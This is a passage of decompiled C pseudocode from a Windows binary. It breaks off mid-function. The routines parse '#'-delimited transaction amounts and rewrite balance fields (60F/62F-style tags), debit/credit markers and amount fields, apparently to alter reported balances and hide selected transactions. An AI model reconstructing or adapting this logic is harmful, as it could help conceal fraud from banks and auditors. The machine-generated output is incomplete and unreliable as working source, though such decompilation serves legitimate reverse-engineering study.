// 40D104: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(_DWORD);
// 40D108: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD);
// 40D114: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD, _DWORD);
// 40D124: using guessed type void __cdecl std::_Xlen();
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D130: using guessed type int __fastcall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(_DWORD, _DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00405A30) --------------------------------------------------------
signed int __cdecl sub_405A30(int a1, unsigned int *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // ebx
  char *v4; // eax
  char *v5; // eax
  __int64 v6; // rax
  unsigned int v7; // esi
  char *v8; // eax
  int v9; // ebp
  bool v10; // cf
  int v11; // eax
  char *v12; // eax
  char *v13; // ecx
  bool v14; // zf
  char v15; // al
  _DWORD *v16; // eax
  char v18; // al
  char v19; // [esp+10h] [ebp-1Ch]
  char *Str; // [esp+14h] [ebp-18h]
  int v21; // [esp+18h] [ebp-14h]
  int v22; // [esp+1Ch] [ebp-10h]
  int v23; // [esp+28h] [ebp-4h]

  *a2 = 0;
  a2[1] = 0;
  v2 = *(_DWORD **)(a1 + 4);
  v3 = (_DWORD *)*v2;
  if ( (_DWORD *)*v2 == v2 )
    return 0;
  while ( 1 )
  {
    v19 = *((_BYTE *)v3 + 8);
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v19, 0);
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
      &v19,
      v3 + 2,
      0,
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
    v4 = Str;
    v23 = 0;
    if ( !Str )
      v4 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    v5 = strchr(v4, 35);
    if ( !v5 )
      break;
    v6 = sub_402270(v5 + 1);
    v7 = v6;
    v8 = Str;
    v9 = HIDWORD(v6);
    if ( !Str )
      v8 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    if ( StrStrIA(v8, aD) )
    {
      v10 = *a2 < v7;
      *a2 -= v7;
      v11 = a2[1] - (v10 + v9);
    }
    else
    {
      v12 = Str;
      if ( !Str )
        v12 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( !StrStrIA(v12, aC) )
        break;
      v10 = __CFADD__(v7, *a2);
      *a2 += v7;
      v11 = v9 + v10 + a2[1];
    }
    v13 = Str;
    v14 = Str == 0;
    a2[1] = v11;
    v23 = -1;
    if ( !v14 )
    {
      v15 = *(v13 - 1);
      if ( v15 && v15 != -1 )
        *(v13 - 1) = v15 - 1;
      else
        sub_40BC56(v13 - 1);
    }
    v3 = (_DWORD *)*v3;
    Str = 0;
    v21 = 0;
    v16 = *(_DWORD **)(a1 + 4);
    v22 = 0;
    if ( v3 == v16 )
      return 0;
  }
  if ( Str )
  {
    v18 = *(Str - 1);
    if ( v18 && v18 != -1 )
    {
      *(Str - 1) = v18 - 1;
      return -1;
    }
    sub_40BC56(Str - 1);
  }
  return -1;
}
// 40D114: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD, _DWORD);
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);

//----- (00405BE0) --------------------------------------------------------
signed int __cdecl sub_405BE0(int a1, char a2, int a3, int a4, char *Str)
{
  const CHAR *v5; // eax
  LPSTR (__stdcall *v6)(LPCSTR, LPCSTR); // esi
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  const CHAR *v9; // eax
  const CHAR *v10; // eax
  char *v11; // eax
  unsigned int v12; // ebp
  const CHAR *v13; // eax
  unsigned int v14; // edi
  int v15; // ebp
  LPCSTR v16; // esi
  int v17; // ST0C_4
  const CHAR *v18; // eax
  unsigned int v19; // ebp
  unsigned int v20; // kr10_4
  CHAR *v21; // eax
  LPCSTR v22; // edx
  const char *v23; // esi
  unsigned int v24; // kr14_4
  unsigned int v25; // edi
  int v26; // ebp
  int v27; // eax
  char v28; // al
  char v29; // al
  int v31; // [esp+10h] [ebp-E4h]
  LPCSTR lpFirst; // [esp+14h] [ebp-E0h]
  unsigned int v33; // [esp+18h] [ebp-DCh]
  char v34; // [esp+23h] [ebp-D1h]
  int v35; // [esp+24h] [ebp-D0h]
  char v36; // [esp+28h] [ebp-CCh]
  char v37; // [esp+29h] [ebp-CBh]
  __int16 v38; // [esp+65h] [ebp-8Fh]
  char v39; // [esp+67h] [ebp-8Dh]
  char Dest; // [esp+68h] [ebp-8Ch]
  char v41; // [esp+69h] [ebp-8Bh]
  __int16 v42; // [esp+E5h] [ebp-Fh]
  char v43; // [esp+E7h] [ebp-Dh]
  int v44; // [esp+F0h] [ebp-4h]

  LOBYTE(v31) = v34;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v31, 0);
  v44 = 0;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
    a1,
    &unk_41104C,
    strlen((const char *)&unk_41104C));
  Dest = 0;
  memset(&v41, 0, 0x7Cu);
  v42 = 0;
  v35 = 1;
  v43 = 0;
  if ( !sub_401E90(Str, (int)&v31, 0) )
  {
    do
    {
      v5 = lpFirst;
      if ( !lpFirst )
        v5 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      v6 = StrStrIA;
      if ( StrStrIA(v5, a60f) )
        goto LABEL_71;
      v7 = lpFirst;
      if ( !lpFirst )
        v7 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( StrStrIA(v7, a60m) )
      {
LABEL_71:
        if ( v33 >= 2 && lpFirst )
        {
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(&v31);
          v21 = (CHAR *)(lpFirst + 2);
        }
        else
        {
          v21 = (CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        }
        *v21 = a2 != 0 ? 70 : 77;
      }
      else
      {
        v8 = lpFirst;
        if ( !lpFirst )
          v8 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( StrStrIA(v8, a62f) )
          goto LABEL_56;
        v9 = lpFirst;
        if ( !lpFirst )
          v9 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( StrStrIA(v9, a62m) )
          goto LABEL_56;
        v10 = lpFirst;
        if ( !lpFirst )
          v10 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( StrStrIA(v10, aDebitCredit) )
        {
          if ( a4 >= 0 && (a4 > 0 || a3) )
            v11 = aCredit;
          else
            v11 = aDebit_0;
          sprintf(&Dest, aDebitCreditS, v11);
          v12 = strlen(&Dest);
          if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(&v31, v12, 1) )
          {
            qmemcpy((void *)lpFirst, &Dest, v12);
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(&v31, v12, v12);
LABEL_24:
            v6 = StrStrIA;
            goto LABEL_25;
          }
        }
        else
        {
          v18 = lpFirst;
          if ( !lpFirst )
            v18 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          if ( StrStrIA(v18, aAmount) )
          {
            v36 = 35;
            memset(&v37, 0, 0x3Cu);
            v38 = 0;
            v39 = 0;
            sub_4020F0(a3, a4, &v37, 0x32u);
            strcat(&v36, asc_40F744);
            sprintf(&Dest, aAmount27s, &v36);
            v20 = strlen(&Dest) + 1;
            v19 = v20 - 1;
            if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                    &v31,
                                    v20 - 1,
                                    1) )
            {
              qmemcpy((void *)lpFirst, &Dest, v19);
              v33 = v20 - 1;
              lpFirst[v19] = 0;
            }
            goto LABEL_24;
          }
        }
      }
LABEL_25:
      v13 = lpFirst;
      if ( !lpFirst )
        v13 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( v6(v13, dword_40F798) )
      {
        v22 = lpFirst;
        v23 = (const char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( lpFirst )
          v23 = lpFirst;
        v24 = strlen(v23) + 1;
        v25 = v24 - 1;
        if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos - *(_DWORD *)(a1 + 8) <= v24 - 1 )
        {
          std::_Xlen();
          v22 = lpFirst;
        }
        if ( v24 != 1 )
        {
          v26 = v25 + *(_DWORD *)(a1 + 8);
          if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                  a1,
                                  v25 + *(_DWORD *)(a1 + 8),
                                  0) )
          {
            qmemcpy((void *)(*(_DWORD *)(a1 + 8) + *(_DWORD *)(a1 + 4)), v23, v25);
            v27 = *(_DWORD *)(a1 + 4);
            *(_DWORD *)(a1 + 8) = v26;
            *(_BYTE *)(v27 + v26) = 0;
          }
LABEL_56:
          v22 = lpFirst;
        }
        if ( v22 )
        {
          v28 = *(v22 - 1);
          if ( v28 && v28 != -1 )
            *((_BYTE *)v22 - 1) = v28 - 1;
          else
            sub_40BC56((void *)(v22 - 1));
        }
        return 0;
      }
      v14 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
      if ( v33 < std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos )
        v14 = v33;
      if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos - *(_DWORD *)(a1 + 8) <= v14 )
        std::_Xlen();
      if ( v14 )
      {
        v15 = v14 + *(_DWORD *)(a1 + 8);
        if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                a1,
                                v14 + *(_DWORD *)(a1 + 8),
                                0) )
        {
          v16 = lpFirst;
          if ( !lpFirst )
            v16 = (LPCSTR)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          qmemcpy((void *)(*(_DWORD *)(a1 + 8) + *(_DWORD *)(a1 + 4)), v16, v14);
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(a1, v14, v15);
        }
      }
      v17 = v35++;
    }
    while ( !sub_401E90(Str, (int)&v31, v17) );
  }
  if ( lpFirst )
  {
    v29 = *(lpFirst - 1);
    if ( v29 && v29 != -1 )
    {
      *((_BYTE *)lpFirst - 1) = v29 - 1;
      return -1;
    }
    sub_40BC56((void *)(lpFirst - 1));
  }
  return -1;
}
// 40D104: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(_DWORD);
// 40D108: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD);
// 40D124: using guessed type void __cdecl std::_Xlen();
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D130: using guessed type int __fastcall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(_DWORD, _DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00406050) --------------------------------------------------------
signed int __cdecl sub_406050(int a1, char a2, int a3, int a4, int a5, int a6, char *Str)
{
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  const CHAR *v9; // eax
  CHAR *v10; // eax
  const CHAR *v11; // eax
  int v12; // ecx
  int v13; // eax
  char *v14; // eax
  unsigned int v15; // ebp
  unsigned int v16; // kr04_4
  unsigned int v17; // edi
  int v18; // ebp
  LPCSTR v19; // esi
  int v20; // eax
  int v21; // eax
  char v22; // al
  const CHAR *v24; // eax
  int v25; // edx
  int v26; // esi
  unsigned int v27; // ebp
  unsigned int v28; // kr0C_4
  char v29; // al
  char v30; // [esp+Bh] [ebp-E5h]
  signed int v31; // [esp+Ch] [ebp-E4h]
  int v32; // [esp+10h] [ebp-E0h]
  LPCSTR lpFirst; // [esp+14h] [ebp-DCh]
  unsigned int v34; // [esp+18h] [ebp-D8h]
  int v35; // [esp+20h] [ebp-D0h]
  char v36; // [esp+24h] [ebp-CCh]
  char v37; // [esp+25h] [ebp-CBh]
  __int16 v38; // [esp+61h] [ebp-8Fh]
  char v39; // [esp+63h] [ebp-8Dh]
  char Dest; // [esp+64h] [ebp-8Ch]
  char v41; // [esp+65h] [ebp-8Bh]
  __int16 v42; // [esp+E1h] [ebp-Fh]
  char v43; // [esp+E3h] [ebp-Dh]
  int v44; // [esp+ECh] [ebp-4h]

  v30 = 0;
  v31 = 0;
  LOBYTE(v32) = 0;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v32, 0);
  Dest = 0;
  memset(&v41, 0, 0x7Cu);
  v42 = 0;
  v43 = 0;
  v44 = 0;
  v35 = 1;
  if ( !sub_401E90(Str, (int)&v32, 0) )
  {
    while ( 1 )
    {
      v7 = lpFirst;
      if ( !lpFirst )
        v7 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( StrStrIA(v7, a62m) )
        goto LABEL_67;
      v8 = lpFirst;
      if ( !lpFirst )
        v8 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( StrStrIA(v8, a62f) )
      {
LABEL_67:
        v31 = 1;
        if ( v34 >= 2 && lpFirst )
        {
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(&v32);
          v10 = (CHAR *)(lpFirst + 2);
        }
        else
        {
          v10 = (CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        }
        *v10 = a2 != 0 ? 70 : 77;
      }
      else
      {
        v9 = lpFirst;
        if ( !lpFirst )
          v9 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( StrStrIA(v9, a64) )
        {
          v31 = 2;
        }
        else if ( v31 <= 0 )
        {
          goto LABEL_41;
        }
      }
      v11 = lpFirst;
      if ( !lpFirst )
        v11 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( StrStrIA(v11, aDebitCredit) )
      {
        if ( v31 == 1 )
        {
          v12 = a3;
          v13 = a4;
        }
        else
        {
          v12 = a5;
          v13 = a6;
        }
        if ( v13 >= 0 && (v13 > 0 || v12) )
          v14 = aCredit;
        else
          v14 = aDebit_0;
        sprintf(&Dest, aDebitCreditS, v14);
        v16 = strlen(&Dest) + 1;
        v15 = v16 - 1;
        if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                &v32,
                                v16 - 1,
                                1) )
        {
          qmemcpy((void *)lpFirst, &Dest, v15);
          v34 = v16 - 1;
          lpFirst[v15] = 0;
        }
      }
      else
      {
        v24 = lpFirst;
        if ( !lpFirst )
          v24 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( StrStrIA(v24, aAmount) )
        {
          if ( v31 == 1 )
          {
            v25 = a3;
            v26 = a4;
          }
          else
          {
            v25 = a5;
            v26 = a6;
          }
          v36 = 35;
          memset(&v37, 0, 0x3Cu);
          v38 = 0;
          v39 = 0;
          sub_4020F0(v25, v26, &v37, 0x32u);
          strcat(&v36, asc_40F744);
          sprintf(&Dest, aAmount27s, &v36);
          v28 = strlen(&Dest) + 1;
          v27 = v28 - 1;
          if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                  &v32,
                                  v28 - 1,
                                  1) )
          {
            qmemcpy((void *)lpFirst, &Dest, v27);
            v34 = v28 - 1;
            lpFirst[v27] = 0;
          }
          if ( v31 == 1 )
          {
            v30 = 1;
LABEL_32:
            v17 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
            if ( v34 < std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos )
              v17 = v34;
            if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos - *(_DWORD *)(a1 + 8) <= v17 )
              std::_Xlen();
            if ( v17 )
            {
              v18 = v17 + *(_DWORD *)(a1 + 8);
              if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                      a1,
                                      v17 + *(_DWORD *)(a1 + 8),
                                      0) )
              {
                v19 = lpFirst;
                if ( !lpFirst )
                  v19 = (LPCSTR)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
                qmemcpy((void *)(*(_DWORD *)(a1 + 4) + *(_DWORD *)(a1 + 8)), v19, v17);
                v20 = *(_DWORD *)(a1 + 4);
                *(_DWORD *)(a1 + 8) = v18;
                *(_BYTE *)(v20 + v18) = 0;
              }
            }
            goto LABEL_41;
          }
        }
      }
      if ( v31 > 0 )
        goto LABEL_32;
LABEL_41:
      v21 = v35++;
      if ( sub_401E90(Str, (int)&v32, v21) )
      {
        if ( !v30 )
          break;
        if ( lpFirst )
        {
          v29 = *(lpFirst - 1);
          if ( v29 && v29 != -1 )
            *((_BYTE *)lpFirst - 1) = v29 - 1;
          else
            sub_40BC56((void *)(lpFirst - 1));
        }
        return 0;
      }
    }
  }
  if ( lpFirst )
  {
    v22 = *(lpFirst - 1);
    if ( v22 && v22 != -1 )
    {
      *((_BYTE *)lpFirst - 1) = v22 - 1;
      return -1;
    }
    sub_40BC56((void *)(lpFirst - 1));
  }
  return -1;
}
// 40D104: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(_DWORD);
// 40D124: using guessed type void __cdecl std::_Xlen();
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00406490) --------------------------------------------------------
signed int __cdecl sub_406490(int a1, int a2, __int64 a3)
{
  char v3; // bl
  unsigned int v4; // ebp
  char *v5; // eax
  int v6; // ST18_4
  char *v7; // eax
  char *v8; // eax
  char *v9; // eax
  char *v10; // edi
  char *v11; // ebp
  __int64 v12; // rax
  char *v13; // eax
  char *v14; // ecx
  int v15; // esi
  char v16; // dl
  char v17; // dl
  char *v18; // ecx
  char *v19; // eax
  char v20; // dl
  unsigned int v21; // ebp
  unsigned int v22; // kr08_4
  unsigned int v23; // edi
  int v24; // ebp
  char *v25; // esi
  char v27; // al
  int v28; // ebx
  char v29; // al
  char v30; // [esp+13h] [ebp-E1h]
  int v31; // [esp+14h] [ebp-E0h]
  int v32; // [esp+18h] [ebp-DCh]
  char *Str; // [esp+1Ch] [ebp-D8h]
  unsigned int v34; // [esp+20h] [ebp-D4h]
  char v35; // [esp+28h] [ebp-CCh]
  char v36; // [esp+29h] [ebp-CBh]
  __int16 v37; // [esp+65h] [ebp-8Fh]
  char v38; // [esp+67h] [ebp-8Dh]
  char Dest; // [esp+68h] [ebp-8Ch]
  char v40; // [esp+69h] [ebp-8Bh]
  char v41; // [esp+A3h] [ebp-51h]
  char v42; // [esp+A4h] [ebp-50h]
  char v43; // [esp+A5h] [ebp-4Fh]
  __int16 v44; // [esp+E5h] [ebp-Fh]
  char v45; // [esp+E7h] [ebp-Dh]
  int v46; // [esp+F0h] [ebp-4h]

  LOBYTE(v32) = v30;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v32, 0);
  v3 = 0;
  v46 = 0;
  v31 = 0;
  v4 = strlen((const char *)&unk_41104C);
  if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a2, v4, 1) )
  {
    qmemcpy(*(void **)(a2 + 4), &unk_41104C, v4);
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(a2, v4, v4);
  }
  while ( 1 )
  {
    v5 = *(char **)(a1 + 4);
    if ( !v5 )
      v5 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    v6 = v31++;
    if ( sub_401E90(v5, (int)&v32, v6) )
    {
      v28 = (v3 != 0) - 1;
      if ( Str )
      {
        v29 = *(Str - 1);
        if ( v29 && v29 != -1 )
          *(Str - 1) = v29 - 1;
        else
          sub_40BC56(Str - 1);
      }
      return v28;
    }
    v7 = Str;
    if ( !Str )
      v7 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    if ( strchr(v7, 35) )
      break;
LABEL_24:
    v23 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
    if ( v34 < std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos )
      v23 = v34;
    if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos - *(_DWORD *)(a2 + 8) <= v23 )
      std::_Xlen();
    if ( v23 )
    {
      v24 = v23 + *(_DWORD *)(a2 + 8);
      if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                              a2,
                              v23 + *(_DWORD *)(a2 + 8),
                              0) )
      {
        v25 = Str;
        if ( !Str )
          v25 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        qmemcpy((void *)(*(_DWORD *)(a2 + 4) + *(_DWORD *)(a2 + 8)), v25, v23);
        *(_DWORD *)(a2 + 8) = v24;
        *(_BYTE *)(*(_DWORD *)(a2 + 4) + v24) = 0;
      }
    }
  }
  Dest = 0;
  memset(&v40, 0, 0x7Cu);
  v44 = 0;
  v45 = 0;
  v8 = Str;
  if ( !Str )
    v8 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
  strncpy(&Dest, v8, 0x7Fu);
  v9 = strchr(&Dest, 35);
  v10 = v9;
  if ( !v9 )
  {
    v46 = -1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v32, 1);
    return -1;
  }
  v11 = strchr(v9 + 1, 35);
  if ( v11 )
  {
    v12 = sub_402270(v10 + 1);
    memset(v10, 0x20u, v11 - v10 + 1);
    v35 = 0;
    memset(&v36, 0, 0x3Cu);
    v37 = 0;
    v38 = 0;
    sub_4020F0(v12 - a3, (unsigned __int64)(v12 - a3) >> 32, &v35, 0x3Fu);
    v13 = strchr(&v35, 46);
    if ( v13 )
    {
      *v13 = 0;
      v42 = 46;
      v14 = &v43;
      if ( v13[1] )
      {
        v15 = v13 + 1 - &v43;
        do
        {
          if ( !*v14 )
            break;
          *v14 = v14[v15];
          v16 = (v14++)[v15 + 1];
        }
        while ( v16 );
      }
      *v14 = 35;
      v17 = *(v13 - 1);
      v18 = v13 - 1;
      v19 = &v41;
      if ( v17 )
      {
        do
        {
          if ( !*v19 )
            break;
          if ( v18 < &v35 )
            break;
          *v19 = *v18;
          v20 = *(v18 - 1);
          --v19;
          --v18;
        }
        while ( v20 );
      }
      *v19 = 35;
      v22 = strlen(&Dest) + 1;
      v21 = v22 - 1;
      v3 = 1;
      if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(&v32, v22 - 1, 1) )
      {
        qmemcpy(Str, &Dest, v21);
        v34 = v22 - 1;
        Str[v21] = 0;
      }
      goto LABEL_24;
    }
  }
  if ( Str )
  {
    v27 = *(Str - 1);
    if ( v27 && v27 != -1 )
    {
      *(Str - 1) = v27 - 1;
      return -1;
    }
    sub_40BC56(Str - 1);
  }
  return -1;
}
// 40D124: using guessed type void __cdecl std::_Xlen();
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D130: using guessed type int __fastcall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(_DWORD, _DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00406810) --------------------------------------------------------
signed int __cdecl sub_406810(int a1, int a2, int a3, int a4, int *a5, __int64 *a6)
{
  int *v6; // eax
  int v7; // edx
  signed int v8; // eax
  int v9; // edi
  int v10; // ebx
  char *v11; // esi
  void **v12; // eax
  __int64 *v13; // esi
  const CHAR *v14; // eax
  LPSTR (__stdcall *v15)(LPCSTR, LPCSTR); // ebp
  __int64 v16; // ST08_8
  const char *v17; // eax
  char *v18; // eax
  __int64 v19; // rax
  int v20; // esi
  const CHAR *v21; // eax
  int v22; // esi
  const CHAR *v23; // eax
  unsigned int v24; // esi
  int v25; // ebp
  LPCSTR v26; // eax
  int v27; // eax
  int *v28; // eax
  unsigned __int8 v29; // cf
  char v30; // al
  int v31; // eax
  char v33; // al
  int v34; // [esp+10h] [ebp-34h]
  unsigned int v35; // [esp+14h] [ebp-30h]
  char v36; // [esp+18h] [ebp-2Ch]
  LPCSTR lpFirst; // [esp+1Ch] [ebp-28h]
  unsigned int v38; // [esp+20h] [ebp-24h]
  int v39; // [esp+24h] [ebp-20h]
  char v40; // [esp+28h] [ebp-1Ch]
  int v41; // [esp+40h] [ebp-4h]
  int v42; // [esp+48h] [ebp+4h]

  v6 = a5;
  v7 = a4;
  *a5 = a3;
  v6[1] = v7;
  v8 = 0;
  v9 = a2;
  if ( *(_DWORD *)(a2 + 8) )
  {
    v10 = a1;
    while ( 1 )
    {
      v42 = v8 + 1;
      if ( v8 >= 20 )
        break;
      v11 = (char *)(**(_DWORD **)(v9 + 4) + 8);
      v36 = *v11;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v36, 0);
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
        &v36,
        v11,
        0,
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
      v12 = *(void ***)(v9 + 4);
      v41 = 0;
      sub_40A1B0((_DWORD *)v9, (int)&a3, *v12);
      v13 = a6;
      if ( a6 )
      {
        v14 = lpFirst;
        if ( !lpFirst )
          v14 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        v15 = StrStrIA;
        if ( StrStrIA(v14, aRpPurchase) )
        {
          v40 = a2;
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v40, 0);
          v16 = *v13;
          LOBYTE(v41) = 1;
          if ( sub_406490((int)&v36, (int)&v40, v16) )
          {
            LOBYTE(v41) = 0;
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v40, 1);
LABEL_39:
            v41 = -1;
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v36, 1);
            return -1;
          }
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
            &v36,
            &v40,
            0,
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
          LOBYTE(v41) = 0;
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v40, 1);
        }
      }
      else
      {
        v15 = StrStrIA;
      }
      v17 = lpFirst;
      if ( !lpFirst )
        v17 = (const char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      v18 = strchr(v17, 35);
      if ( !v18 )
        goto LABEL_39;
      v19 = sub_402270(v18 + 1);
      v20 = v19;
      v21 = lpFirst;
      v34 = v20;
      v35 = HIDWORD(v19);
      if ( !lpFirst )
        v21 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( v15(v21, aD) )
      {
        v22 = -v20;
        v34 = v22;
        v35 = (unsigned __int64)-(signed __int64)__PAIR__(v35, v22) >> 32;
      }
      else
      {
        v23 = lpFirst;
        if ( !lpFirst )
          v23 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( !v15(v23, aC) )
        {
          if ( lpFirst )
          {
            v33 = *(lpFirst - 1);
            if ( v33 && v33 != -1 )
            {
              *((_BYTE *)lpFirst - 1) = v33 - 1;
              return -1;
            }
            sub_40BC56((void *)(lpFirst - 1));
          }
          return -1;
        }
      }
      v24 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
      if ( v38 < std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos )
        v24 = v38;
      if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos - *(_DWORD *)(v10 + 8) <= v24 )
        std::_Xlen();
      if ( v24 )
      {
        v25 = v24 + *(_DWORD *)(v10 + 8);
        if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                v10,
                                v24 + *(_DWORD *)(v10 + 8),
                                0) )
        {
          v26 = lpFirst;
          if ( !lpFirst )
